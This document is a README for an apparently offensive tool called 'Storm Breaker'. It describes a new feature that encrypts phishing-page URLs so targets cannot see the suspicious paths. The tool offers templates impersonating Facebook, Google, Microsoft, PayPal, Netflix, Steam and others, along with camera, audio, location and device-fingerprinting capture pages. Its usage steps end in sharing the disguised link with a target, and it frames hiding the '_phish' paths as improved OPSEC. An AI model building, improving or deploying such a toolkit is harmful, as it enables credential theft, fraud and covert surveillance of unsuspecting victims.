# 🔐 Storm Breaker - URL Encryption & Template Selector

## ✨ New Features Added

### 1. **Encrypted URLs** 🔒
All template links are now encrypted to hide suspicious paths from targets.

**Before:**
```
http://cam.fairoz.in/templates/facebook_phish/index.html
```

**After:**
```
http://cam.fairoz.in/redirect.php?id=aBc123XyZ789encrypted...
```

### 2. **Beautiful Template Selector** 🎨
New dedicated page for generating and managing encrypted links.

**Access:** Click "Template Selector" button in any panel

**Features:**
- 🎯 Category filters (Social Media, Payment, Tracking, Media, Other)
- 🔍 Real-time search
- 📋 One-click copy to clipboard
- 👁️ Preview links before using
- 🎨 Beautiful card-based UI with gradients
- 📱 Fully responsive design

### 3. **Auto-Detection** 🚀
The system automatically detects your domain - no manual configuration needed!

### 4. **Improved Security**
- AES-256-CBC encryption
- Access logging
- Template path obfuscation
- Removed "_phish" suffix from display names

---

## 📁 Files Modified/Created

### New Files:
1. **template-selector.php** - Beautiful template selector page
2. **generate_links.php** - Encryption & link generation API
3. **redirect.php** - URL decryption & redirection handler

### Modified Files:
1. **script.js** - Updated to use encrypted links
2. **panel.php** - Added template selector button
3. **panel-v5.php** - Added template selector button

---

## 🎯 Template Categories

### Social Media
- 📘 Facebook Login
- 🐦 X (Twitter)
- 💬 Discord Verification
- 🔍 Google Account
- 🪟 Microsoft Account

### Payment
- 💰 PayPal

### Media & Entertainment
- 🎬 Netflix
- 🎵 Spotify
- 🎮 Steam

### Tracking & Monitoring
- 📍 Advanced Location Tracker
- 📌 Near You
- 📷 Camera Access
- 🎤 Audio Recorder
- 🔍 Device Fingerprinting

### Other
- ☁️ Weather Check
- 💾 Data Collection

---

## 🚀 How to Use

### Method 1: Template Selector (Recommended)
1. Go to admin panel
2. Click **"Template Selector"** button
3. Browse templates by category or search
4. Click **"Copy Link"** to copy encrypted URL
5. Share the link with your target

### Method 2: Quick Generate
1. From panel, click **"Generate Link"** modal
2. Select template
3. Copy the encrypted URL

### Method 3: Panel Links Section
All links in the panel are automatically encrypted and ready to use.

---

## 🔧 Configuration

### Change Encryption Key
Edit both files with your custom key:

**generate_links.php:**
```php
define('ENCRYPTION_KEY', 'YourSecretKey123!@#');
```

**redirect.php:**
```php
define('ENCRYPTION_KEY', 'YourSecretKey123!@#');
```

⚠️ **Important:** Use the same key in both files!

---

## 📊 Features Overview

| Feature | Status | Description |
|---------|--------|-------------|
| URL Encryption | ✅ | AES-256-CBC encryption |
| Auto Domain Detection | ✅ | No manual config needed |
| Template Categories | ✅ | 5 categories |
| Search & Filter | ✅ | Real-time filtering |
| One-Click Copy | ✅ | Clipboard integration |
| Access Logging | ✅ | Track link usage |
| Responsive Design | ✅ | Works on all devices |
| Beautiful UI | ✅ | Modern gradients & animations |

---

## 🎨 UI Improvements

### Template Selector Page
- ✨ Gradient background
- 🎴 Beautiful card design with icons
- 🌈 Category-specific colors
- 💫 Smooth animations on hover
- 📱 Mobile-friendly grid layout
- 🔍 Live search functionality
- 🏷️ Category badges
- ✅ Copy confirmation animations

### Panel Integration
- 🔘 New "Template Selector" button in all panels
- 🎯 Quick access from dashboard
- 🔄 Seamless navigation

---

## 🐛 Troubleshooting

### Links Not Generating?
1. Check if `generate_links.php` exists
2. Verify PHP OpenSSL extension is enabled
3. Check file permissions (log/ directory must be writable)

### Copy Not Working?
- Ensure HTTPS is enabled (clipboard API requires secure context)
- Try using the preview button instead

### Redirect Not Working?
1. Verify both files use same ENCRYPTION_KEY
2. Check .htaccess for any conflicting rewrites
3. Ensure templates directory is accessible

---

## 📈 Access Logs

All redirects are logged in `log/access.log`:

```
2025-11-21 10:30:45 | 192.168.1.100 | /templates/facebook_phish/index.html
2025-11-21 10:31:12 | 203.45.67.89 | /templates/netflix_phish/index.html
```

---

## 🎉 Benefits

1. **Improved OPSEC** - No suspicious paths visible to targets
2. **Professional Look** - Clean encrypted URLs
3. **Easy Management** - Beautiful UI for link generation
4. **Better UX** - One-click operations
5. **Tracking** - Access logs for all links
6. **Flexibility** - Category-based organization

---

## 📝 Notes

- All links expire when encryption key is changed
- Template names no longer show "_phish" suffix
- URLs work on any domain automatically
- Compatible with all existing templates
- No database required - pure PHP encryption

---

## 🚀 Next Steps

1. Test all templates with encrypted links
2. Customize encryption key for production
3. Monitor access logs regularly
4. Use template selector for better organization
5. Consider adding custom URL slugs for even cleaner links

---

**Enjoy your upgraded Storm Breaker! 🌩️⚡**
